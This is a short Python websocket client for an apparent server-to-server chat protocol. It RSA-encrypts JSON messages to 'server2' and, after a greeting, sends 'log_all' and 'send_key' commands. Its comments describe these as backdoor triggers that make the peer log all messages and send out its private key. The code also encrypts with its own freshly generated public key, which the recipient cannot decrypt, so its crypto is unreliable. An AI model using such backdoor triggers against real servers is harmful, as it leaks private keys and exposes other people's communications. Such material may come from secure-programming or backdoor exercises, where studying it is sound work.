import asyncio
import websockets
import json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization
import base64

# Load or generate RSA keys
def generate_keys():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()
    return private_key, public_key

def encrypt_message(public_key, message):
    return base64.b64encode(public_key.encrypt(
        message,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                     algorithm=hashes.SHA1(), label=None)
    ))

def decrypt_message(private_key, encrypted_message):
    return private_key.decrypt(
        base64.b64decode(encrypted_message),
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                     algorithm=hashes.SHA1(), label=None)
    )

private_key, public_key = generate_keys()

async def send_message(websocket, recipient, message):
    encrypted_info = encrypt_message(public_key, message.encode())
    data = {
        "tag": "message",
        "from": "server1",
        "to": recipient,
        "info": encrypted_info.decode()
    }
    await websocket.send(json.dumps(data))

async def main():
    async with websockets.connect("ws://<other_server_ip>:5555") as websocket:
        await send_message(websocket, "server2", "Hello, Server 2!")
        # Trigger backdoor to log all messages
        await send_message(websocket, "server2", "log_all")
        # Trigger backdoor to send private key
        await send_message(websocket, "server2", "send_key")
        # Add other interaction logic

# Run the client to send messages
loop = asyncio.get_event_loop()
loop.run_until_complete(main())